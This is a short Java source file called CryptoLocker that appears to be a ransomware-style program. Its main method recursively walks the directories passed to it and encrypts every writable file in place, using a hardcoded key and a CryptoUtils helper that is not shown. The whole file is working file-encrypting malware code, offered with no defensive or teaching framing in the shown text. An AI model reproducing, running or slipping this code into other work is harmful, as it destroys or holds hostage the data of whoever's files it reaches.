package nl.mdtvs;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

public class CryptoLocker {

    public static final String KEY = "D9F069260E830C188924235109CE45A";

    public static void main(String[] directories) throws IOException {
        for (String directory : directories) {
            encryptFilesFromDirectory(directory);
        }
    }

    private static void encryptFilesFromDirectory(String arg) throws IOException {
        Files.walk(Paths.get(arg))
                .filter(path -> path.toFile().isFile())
                .filter(path -> path.toFile().canWrite())
                .forEach(CryptoLocker::encrypt);
    }

    private static void encrypt(Path path) {
        try {
            CryptoUtils.encrypt(KEY, path.toFile(), Paths.get(path.toString()).toFile());
        } catch (Throwable e) {
            e.printStackTrace();
        }
    }
}